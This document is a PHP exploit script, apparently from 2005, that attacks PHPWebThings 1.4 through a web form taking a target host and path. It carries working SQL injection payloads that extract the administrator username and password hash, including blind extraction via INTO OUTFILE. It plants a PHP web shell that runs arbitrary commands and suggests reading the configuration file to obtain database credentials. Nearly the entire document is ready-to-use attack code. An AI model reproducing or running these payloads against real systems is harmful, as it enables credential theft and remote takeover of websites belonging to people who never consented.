<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-symbol">&lt;?php
#   ---phpwebth14_xpl.php                               10.47 16/11/2005       #
#                                                                              #
#     PHPWebThings 1.4 &quot;msg&quot; and &quot;forum&quot; SQL injection /  Administrative       #
#          credentials  disclosure and remote commands execution               #
#                                                                              #
#                              coded by rgod                                   #
#                    site: http://rgod.altervista.org                          #
#                                                                              #
#    based on http://secunia.com/advisories/17410/, but here we have a more    #
#    chritical injection in msg parameter that works with magic_quotes_gpc on) #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  make these changes in php.ini if you have troubles                          #
#  with this script:                                                           #
#  allow_call_time_pass_reference = on                                         #
#  register_globals = on                                                       #
#                                                                              #
#  Sun-Tzu:&quot;He wins his battles by making no mistakes.  Making no mistakes is  #
#  what establishes the certainty of victory, for it means conquering an enemy #
#  that is already defeated.&quot;

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 2);
ob_implicit_flush (1);

echo'&lt;html&gt;&lt;head&gt;&lt;title&gt; PHPWebThings  1.4  &quot;msg&quot;  and  &quot;forum&quot;  SQL   injection
&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
&lt;style type=&quot;text/css&quot;&gt; body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;Stile6&quot;&gt;
PHPWebThings  1.4  &quot;msg&quot;  and  &quot;forum&quot;  SQL   injection &lt;/p&gt;&lt;p class=&quot;Stile6&quot;&gt;a
script  by  rgod  at        &lt;a href=&quot;http://rgod.altervista.org&quot;target=&quot;_blank&quot;&gt;
http://rgod.altervista.org&lt;/a&gt;&lt;/p&gt;&lt;table width=&quot;84%&quot;&gt;&lt;tr&gt;&lt;td width=&quot;43%&quot;&gt;  &lt;form
name=&quot;form1&quot;      method=&quot;post&quot;   action=&quot;'.$SERVER[PHP_SELF].'?path=value&amp;host=
value&amp;port=value&amp;proxy=value&amp;action=value&amp;fullpath=value&amp;table_prefix=value&quot;&gt;&lt;p&gt;
&lt;input  type=&quot;text&quot; name=&quot;host&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt; * hostname (ex: www.sitena
me.com) &lt;/span&gt; &lt;/p&gt; &lt;p&gt;  &lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;  &lt;span class=&quot;Stile5&quot;&gt;
* path ( ex: /phpwebthings/  or just / ) &lt;/span&gt;&lt;/p&gt; &lt;p&gt; &lt;input      type=&quot;text&quot;
name=&quot;action&quot;&gt;   &lt;span class=&quot;Stile5&quot;&gt; * action: HASH to see admin username  and
MD5 password hash, CMD to launch commands, PATH to disclose  full    application
path &lt;/span&gt;&lt;/p&gt;&lt;p&gt; &lt;input   type=&quot;text&quot; name=&quot;fullpath&quot;&gt;  &lt;span class=&quot;Stile5&quot;&gt;
full path to www,  need  this for &quot;INTO OUTFILE&quot; statements (ex.: C:\\\www\\\sit
e\\\, /www/site/, or with backslashes from MySQL data directory: ../../www/site/
)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;command&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;  specify
a command, cat wt_config.php to see database username &amp; password&lt;/span&gt;&lt;/p&gt;  &lt;p&gt;
&lt;input type=&quot;text&quot; name=&quot;table_prefix&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt; specify  a   table
prefix other than the default (wt_)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;port&quot;&gt;
&lt;span class=&quot;Stile5&quot;&gt;specify  a  port other  than  80 ( default  value ) &lt;/span&gt;
&lt;/p&gt; &lt;p&gt;  &lt;input  type=&quot;text&quot; name=&quot;proxy&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;  send  exploit
through an  HTTP proxy (ip:port)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;Submit&quot;
value=&quot;go!&quot;&gt;&lt;/p&gt;&lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;';


function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
while ($ii &lt;= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
             for ($li=0; $li&lt;=15; $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li+$ki].&quot;&lt;/td&gt;&quot;;
			    }
            $ki=$ki+16;
            echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
            }
if (strlen($datai)==1) {echo &quot;&lt;td&gt;0&quot;.$datai.&quot;&lt;/td&gt;&quot;;} else
{echo &quot;&lt;td&gt;&quot;.$datai.&quot;&lt;/td&gt; &quot;;}
$ii++;
$ji++;
}
for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
                       }

for ($li=$ci*16; $li&lt;=strlen($headeri); $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li].&quot;&lt;/td&gt;&quot;;
			    }
echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket &lt; 0) {
                   echo &quot;socket_create() failed: reason: &quot; . socket_strerror($socket) . &quot;&lt;br&gt;&quot;;
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo &quot;OK.&lt;br&gt;&quot;;
                    echo &quot;Attempting to connect to &quot;.$host.&quot; on port &quot;.$port.&quot;...&lt;br&gt;&quot;;
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result &lt; 0) {
                                     echo &quot;socket_connect() failed.\r\nReason: (&quot;.$result.&quot;) &quot; . socket_strerror($result) . &quot;&lt;br&gt;&lt;br&gt;&quot;;
                                    }
	                       else
		                    {
                                     echo &quot;OK.&lt;br&gt;&lt;br&gt;&quot;;
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo &quot;Reading response:&lt;br&gt;&quot;;
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo &quot;Closing socket...&quot;;
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}


if (($host&lt;&gt;'') and ($path&lt;&gt;'') and ($action&lt;&gt;''))
{
$port=intval(trim($port));
if ($port=='') {$port=80;}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($table_prefix=='') {$table_prefix=&quot;wt_&quot;;}
$action=strtoupper($action);
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$host=str_replace(&quot;\r\n&quot;,&quot;&quot;,$host);
$path=str_replace(&quot;\r\n&quot;,&quot;&quot;,$path);
$fullpath=str_replace(&quot;\r\n&quot;,&quot;&quot;,$fullpath);
$table_prefix=str_replace(&quot;\r\n&quot;,&quot;&quot;,$table_prefix);

if ($action==&quot;HASH&quot;)
{
#STEP 1 - This works with magic_quotes_gpc both on or off (great... ;) ) and exploits the vulnerability in
#         [path_to_phpwb]/modules/forum/split.php
#STEP 1A -&gt; Retrieve admin username from database...
$SQL=&quot;-999 UNION SELECT 0,0,0,0,0,name,0,0,0,0,0,0,0,0 FROM &quot;.$table_prefix.&quot;users WHERE uid=1/*&quot;;
$SQL=urlencode($SQL);
$packet=&quot;GET &quot;.$p.&quot;forum.php?act=split&amp;msg=&quot;.$SQL.&quot;&amp;forum=1 HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
$temp=explode('name=&quot;subname&quot; value=&quot;',$html);
$temp2=explode('&quot;',$temp[1]);
$NAME=$temp2[0];

#STEP 1B -&gt; Retrieve MD5 admin password hash from database...
$SQL=&quot;-999 UNION SELECT 0,0,0,0,0,password,0,0,0,0,0,0,0,0 FROM &quot;.$table_prefix.&quot;users WHERE uid=1/*&quot;;
$SQL=urlencode($SQL);
$packet=&quot;GET &quot;.$p.&quot;forum.php?act=split&amp;msg=&quot;.$SQL.&quot;&amp;forum=1 HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
$temp=explode('name=&quot;subname&quot; value=&quot;',$html);
$temp2=explode('&quot;',$temp[1]);
$HASH=$temp2[0];

echo &quot;NAME -&gt;&quot;.htmlentities($NAME).&quot;&lt;br&gt;&quot;;
echo &quot;HASH -&gt;&quot;.htmlentities($HASH).&quot;&lt;br&gt;&quot;;

if ($HASH&lt;&gt;'') {echo &quot;Exploit succeeded...&quot;;
                die;
                }
          else {echo &quot;Exploit failed... trying next step...&lt;BR&gt;&quot;; }

#STEP 2 -&gt; Try blind injection and save data into output files... this works with magic quotes off
#          and exploits the vulnerability in [path_to_phpwb]/forum.php
#          we have only an int() as table value so we have to encode username and hash
#          as integers in a lot of files
#STEP 2A -&gt; Retrieve admin username fro database...

if ($fullpath&lt;&gt;'')
{
for ($z=1; $z&lt;=20; $z++)
{
$SQL='';
$SQL[$z]=&quot;-999 UNION SELECT ORD(SUBSTRING(name,&quot;.$z.&quot;,1)) INTO OUTFILE '&quot;.$fullpath.&quot;keepU&quot;.$z.&quot;'FROM &quot;.$table_prefix.&quot;users WHERE uid=1&quot;;
$SQL[$z]=urlencode($SQL[$z]);
$packet=&quot;GET &quot;.$p.&quot;forum.php?act=markread&amp;forum=&quot;.$SQL[$z].&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);

}

$NAME='';
for ($z=1; $z&lt;=20; $z++)
{
$packet=&quot;GET &quot;.$p.&quot;keepU&quot;.$z.&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
if (!eregi('200 OK',$html)) {break;}
$temp=explode(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html);
$temp2=explode(chr(0x0a),$temp[1]);
$NAME.=chr($temp2[0]);

}

#STEP 2B -&gt; MD5 admin password hash from database...
for ($z=1; $z&lt;=32; $z++)
{
$SQL='';
$SQL[$z]=&quot;-999 UNION SELECT ORD(SUBSTRING(password,&quot;.$z.&quot;,1)) INTO OUTFILE '&quot;.$fullpath.&quot;keep&quot;.$z.&quot;'FROM &quot;.$table_prefix.&quot;users WHERE uid=1&quot;;
$SQL[$z]=urlencode($SQL[$z]);
$packet=&quot;GET &quot;.$p.&quot;forum.php?act=markread&amp;forum=&quot;.$SQL[$z].&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);

}

$HASH='';
for ($z=1; $z&lt;=32; $z++)
{
$packet=&quot;GET &quot;.$p.&quot;keep&quot;.$z.&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
if (!eregi('200 OK',$html)) {break;}
$temp=explode(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html);
$temp2=explode(chr(0x0a),$temp[1]);
$HASH.=chr($temp2[0]);

}
echo &quot;&lt;br&gt; NAME -&gt;&quot;.htmlentities($NAME);
echo &quot;&lt;br&gt; HASH -&gt;&quot;.htmlentities($HASH);
}
else
{echo &quot;&lt;BR&gt;You need to specify a full application path for STEP 2...&quot;; die;}
}
else
if ($action==&quot;CMD&quot;)
{
#STEP X -&gt; Inject a shell, this works with magic_quotes_gpc off
#Note:     we could encode shell as an array of chars but
#          real problem is that you have to specify output filename literally
#          so you are forced to use quotes
#          you should specify a full path for shell.php
#ex:       /www/site/
#          c:\\www\\site\\ (this on windows)
#or with backslashes (from Mysql data directory):
#         ../../www/phpwebthings/
#you can disclose the path manually, ex:
#
#http://[target]/[path_to_phpwebthings/sideboxes/counter.php
#http://[target]/[path_to_phpwebthings/sideboxes/lastvisit.php
#if not specified we try to see theese urls...
if (($command&lt;&gt;'') and ($fullpath&lt;&gt;''))
{
$SHELL=&quot;:)&lt;?php error_reporting(0);ini_set(\&quot;max_execution_time\&quot;,0);system(\$_GET[cmd]);?&gt;&quot;;
$SQL=&quot;-999 UNION SELECT 0,0,0,0,0,'&quot;.$SHELL.&quot;',0,0,0,0,0,0,0,0 INTO OUTFILE '&quot;.$fullpath.&quot;suntzu.php' FROM &quot;.$table_prefix.&quot;users/*&quot;;
$SQL=urlencode($SQL);
$packet=&quot;GET &quot;.$p.&quot;forum.php?act=split&amp;msg=&quot;.$SQL.&quot;&amp;forum=1 HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);

$packet=&quot;GET &quot;.$p.&quot;suntzu.php?cmd=&quot;.urlencode($command).&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
if (eregi(':)',$html)) {echo &quot;Exploit succeded...&quot;;}
                         else {echo &quot;Exploit failed...&quot;;}
}
else {echo &quot;Specify a command and full application path for CMD action...&quot;; die;}
}
else
if ($action==&quot;PATH&quot;)
{
$packet=&quot;GET &quot;.$p.&quot;sideboxes/counter.php HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);

$packet=&quot;GET &quot;.$p.&quot;sideboxes/lastvisit.php HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
}
else
{echo &quot;Specify an action...&quot;; }

}
else
{echo 'Specify * required fields, optionally specify a proxy...';}
?&gt;
</span></span>
</code></pre>
